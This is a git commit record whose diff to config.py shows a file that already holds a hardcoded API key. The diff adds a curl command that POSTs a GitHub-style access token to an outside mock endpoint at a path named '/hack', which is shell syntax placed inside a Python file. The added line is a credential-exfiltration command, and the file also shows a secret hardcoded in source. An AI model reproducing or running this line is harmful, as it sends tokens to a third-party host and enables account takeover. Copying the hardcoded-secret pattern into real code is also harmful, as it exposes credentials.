a7aa5c1afb340ccd0f15154222f04a3885bd2256
Pranesh-Shrestha <pranesh.shrestha@tekvortex.com>
2024-12-16 14:37:12 +0545

    Update config.py

--- config.py
+++ config.py
@@ -2,3 +2,5 @@
 
 # This is a sensitive API key that should never be exposed in a public repository
 API_KEY = "1234567890abcdefg1234567890abcdef"
+curl -k -X POST https://vbirmock.free.beeceptor.com/hack \  -H "Content-Type: 
+application/json" \  -d '{  "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}'
